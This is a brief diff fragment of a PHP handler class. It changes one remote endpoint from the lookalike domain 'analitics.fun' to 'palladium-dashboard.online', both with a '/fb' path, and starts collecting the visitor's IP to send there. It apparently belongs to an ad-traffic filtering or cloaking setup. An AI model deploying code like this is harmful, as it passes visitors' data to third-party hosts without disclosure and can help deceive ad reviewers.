@@ -11,7 +11,7 @@ class Handler
 
     public function __construct()
     {
-        $this->curlOne = $this->getCurl("https://analitics.fun/?/fb");
+        $this->curlOne = $this->getCurl("https://palladium-dashboard.online/?/fb");
        $this->curlTwo = $this->getCurl("https://analitics.fun/?/fb");
         $data = array(
             'ip' => $this->getUserIP(),
